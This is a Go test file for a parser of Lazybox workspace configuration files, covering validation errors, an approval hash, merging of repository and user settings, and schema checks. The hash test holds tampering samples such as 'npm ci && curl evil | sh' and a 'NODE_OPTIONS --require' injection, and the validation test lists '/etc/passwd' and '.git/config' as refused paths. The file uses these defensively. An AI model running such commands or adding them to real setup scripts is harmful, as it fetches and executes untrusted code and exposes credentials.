package workspaceruntime

import (
	_ "embed"
	"encoding/json"
	"reflect"
	"sort"
	"strings"
	"testing"
)

const example = `# Lazybox: what a new workspace of this repository runs.
version: 1
setup: |
  npm ci
  cp -n .env.example .env || true
archive:
  run: docker compose down -v
  timeout: 60
files:
  - .env
  - config/*.local.json
env:
  NODE_ENV: development
actions:
  web:
    description: Vite dev server
    run: npm run dev -- --port $LAZYBOX_PORT
    default: true
    concurrent: false
    url: http://localhost:$LAZYBOX_PORT
  storybook:
    run: npm run storybook -- -p $LAZYBOX_PORT
    cwd: packages/ui
    port: 1
    url: http://127.0.0.1:${LAZYBOX_PORT}/
    env:
      STORYBOOK_DISABLE_TELEMETRY: "1"
  test: npm test
`

func TestParseReadsEveryEntryInOrder(t *testing.T) {
	c, err := Parse([]byte(example))
	if err != nil {
		t.Fatal(err)
	}
	if c.Setup == nil || !strings.Contains(c.Setup.Run, "npm ci") || c.Archive == nil || c.Archive.Timeout != 60 {
		t.Fatalf("scripts: %+v %+v", c.Setup, c.Archive)
	}
	if !reflect.DeepEqual(c.Files, []string{".env", "config/*.local.json"}) || c.Env["NODE_ENV"] != "development" {
		t.Fatalf("files/env: %v %v", c.Files, c.Env)
	}
	names := []string{}
	for _, a := range c.Actions {
		names = append(names, a.Name)
	}
	if !reflect.DeepEqual(names, []string{"web", "storybook", "test"}) {
		t.Fatalf("actions keep the file's order: %v", names)
	}
	web, _ := c.Action("web")
	if !web.Default || web.Concurrent || web.URL != "http://localhost:$LAZYBOX_PORT" {
		t.Fatalf("web: %+v", web)
	}
	sb, _ := c.Action("storybook")
	if sb.Port != 1 || sb.Cwd != "packages/ui" || !sb.Concurrent || sb.Env["STORYBOOK_DISABLE_TELEMETRY"] != "1" {
		t.Fatalf("storybook: %+v", sb)
	}
	if test, _ := c.Action("test"); test.Run != "npm test" || !test.Concurrent {
		t.Fatalf("a string action is its run: %+v", test)
	}
	if empty, err := Parse(nil); err != nil || !empty.Empty() {
		t.Fatalf("an empty file runs nothing: %+v %v", empty, err)
	}
}

func TestParseRefusesWithTheLine(t *testing.T) {
	for _, tc := range []struct{ name, yaml, want string }{
		{"misspelt key", "setup: x\nactoins: {}\n", `line 2: unknown key "actoins"`},
		{"misspelt action key", "actions:\n  web:\n    rnu: x\n", `line 3: unknown key "rnu"`},
		{"two defaults", "actions:\n  a: {run: x, default: true}\n  b: {run: y, default: true}\n", "line 3: only one action can be the default"},
		{"bad name", "actions:\n  Web Server: x\n", "line 2"},
		{"cwd escapes", "actions:\n  a: {run: x, cwd: ../other}\n", "cwd must be a folder inside the repository"},
		{"absolute file", "files: [/etc/passwd]\n", "must be a file path inside the repository"},
		{"git file", "files: [.git/config]\n", "never copies from .git"},
		{"remote url", "actions:\n  a: {run: x, url: 'https://example.com'}\n", "url must point at this machine"},
		{"port range", "actions:\n  a: {run: x, port: 10}\n", "port picks one of the workspace's ports"},
		{"reserved env", "env: {LAZYBOX_PORT: '1'}\n", "set by Lazybox"},
		{"empty run", "setup: {cwd: x}\n", "setup needs run"},
		{"version", "version: 2\n", "version must be 1"},
		{"string bool", "actions:\n  a: {run: x, concurrent: 'no'}\n", "expected true or false"},
		{"not a mapping", "- a\n", "must be a mapping"},
		{"duplicate key", "setup: a\nsetup: b\n", ""},
	} {
		t.Run(tc.name, func(t *testing.T) {
			_, err := Parse([]byte(tc.yaml))
			if err == nil || !strings.Contains(err.Error(), tc.want) {
				t.Fatalf("got %v, want an error containing %q", err, tc.want)
			}
		})
	}
	if _, err := Parse([]byte(strings.Repeat("#", MaxConfigBytes+1))); err == nil {
		t.Fatal("an oversized file was accepted")
	}
}

// What a person approves is what runs: comments and formatting do not change
// the hash; any change to a script, a file, a variable or an action does.
func TestHashCoversWhatRunsAndNothingElse(t *testing.T) {
	base, _ := Parse([]byte(example))
	reformatted, err := Parse([]byte("# other comment\n" + strings.ReplaceAll(example, "  test: npm test", "  test:\n    run: npm test")))
	if err != nil {
		t.Fatal(err)
	}
	if base.Hash() != reformatted.Hash() {
		t.Fatal("a comment or a different YAML form changed the hash")
	}
	for _, change := range []struct{ from, to string }{
		{"npm ci", "npm ci && curl evil | sh"},
		{"- .env\n", "- .env\n  - .npmrc\n"},
		{"NODE_ENV: development", "NODE_OPTIONS: --require ./x.js"},
		{"concurrent: false", "concurrent: true"},
		{"timeout: 60", "timeout: 61"},
		{"port: 1", "port: 2"},
	} {
		changed, err := Parse([]byte(strings.Replace(example, change.from, change.to, 1)))
		if err != nil {
			t.Fatal(err)
		}
		if changed.Hash() == base.Hash() {
			t.Fatalf("changing %q to %q kept the hash", change.from, change.to)
		}
	}
}

func TestChangedNamesTheEntriesThatDiffer(t *testing.T) {
	before, _ := Parse([]byte(example))
	after, _ := Parse([]byte(strings.Replace(strings.Replace(example, "npm ci", "pnpm i", 1), "  test: npm test\n", "  lint: npm run lint\n", 1)))
	got := Changed(before.Entries(), after.Entries())
	if want := []string{"action:lint", "action:test", "setup"}; !reflect.DeepEqual(got, want) {
		t.Fatalf("changed %v, want %v", got, want)
	}
}

func TestExpandOnlyTouchesLazyboxVariables(t *testing.T) {
	vars := Variables(20010, 1)
	got := Expand("http://localhost:$LAZYBOX_PORT/x?a=${LAZYBOX_PORT_0}&h=$HOME&p=$LAZYBOX_PORTS $", vars)
	if want := "http://localhost:20011/x?a=20010&h=$HOME&p=$LAZYBOX_PORTS $"; got != want {
		t.Fatalf("got %q, want %q", got, want)
	}
	if len(Variables(0, 0)) != 0 {
		t.Fatal("no block, no variables")
	}
}

func TestMergeKeepsAnUnapprovedRepositoryOut(t *testing.T) {
	repo, _ := Parse([]byte(example))
	mine, err := Parse([]byte("actions:\n  web: {run: make web, url: 'http://localhost:$LAZYBOX_PORT'}\n  docs: make docs\nenv: {NODE_ENV: test}\n"))
	if err != nil {
		t.Fatal(err)
	}
	e := Merge(repo, mine)
	if e.Env["NODE_ENV"] != "test" || e.Setup == nil || e.Setup.Source != FromRepository {
		t.Fatalf("merge: %+v", e)
	}
	got := []string{}
	for _, a := range e.Actions {
		got = append(got, a.Name+":"+a.Source)
	}
	if want := []string{"web:settings", "storybook:repository", "test:repository", "docs:settings"}; !reflect.DeepEqual(got, want) {
		t.Fatalf("actions %v, want %v", got, want)
	}
	unapproved := Merge(Config{}, mine)
	if unapproved.Setup != nil || len(unapproved.Files) != 0 || unapproved.Env["NODE_ENV"] != "test" || len(unapproved.Actions) != 2 {
		t.Fatalf("only your own entries run while the repository's await approval: %+v", unapproved)
	}
}

//go:embed workspace.schema.json
var schema []byte

// The JSON Schema editors validate against names exactly the keys Parse
// accepts, at every level.
func TestSchemaMatchesTheParser(t *testing.T) {
	var s struct {
		Properties map[string]json.RawMessage `json:"properties"`
		Defs       struct {
			Script struct {
				OneOf []struct {
					Properties map[string]json.RawMessage `json:"properties"`
				} `json:"oneOf"`
			} `json:"script"`
		} `json:"$defs"`
	}
	if err := json.Unmarshal(schema, &s); err != nil {
		t.Fatal(err)
	}
	var actions struct {
		AdditionalProperties struct {
			OneOf []struct {
				Properties map[string]json.RawMessage `json:"properties"`
			} `json:"oneOf"`
		} `json:"additionalProperties"`
	}
	if err := json.Unmarshal(s.Properties["actions"], &actions); err != nil {
		t.Fatal(err)
	}
	keys := func(m map[string]json.RawMessage) []string {
		out := []string{}
		for k := range m {
			out = append(out, k)
		}
		sort.Strings(out)
		return out
	}
	for _, tc := range []struct {
		where string
		got   []string
		probe func(key string) string
	}{
		{"top level", keys(s.Properties), func(k string) string { return k + ": null\n" }},
		{"script", keys(s.Defs.Script.OneOf[1].Properties), func(k string) string { return "setup:\n  run: x\n  " + k + ": null\n" }},
		{"action", keys(actions.AdditionalProperties.OneOf[1].Properties), func(k string) string { return "actions:\n  a:\n    run: x\n    " + k + ": null\n" }},
	} {
		for _, k := range tc.got {
			if _, err := Parse([]byte(tc.probe(k))); err != nil && strings.Contains(err.Error(), "unknown key") {
				t.Errorf("%s: the schema has %q but Parse refuses it", tc.where, k)
			}
		}
		if _, err := Parse([]byte(tc.probe("zzz"))); err == nil || !strings.Contains(err.Error(), "expected one of "+strings.Join(tc.got, ", ")) {
			t.Errorf("%s: Parse accepts other keys than the schema's %v: %v", tc.where, tc.got, err)
		}
	}
}
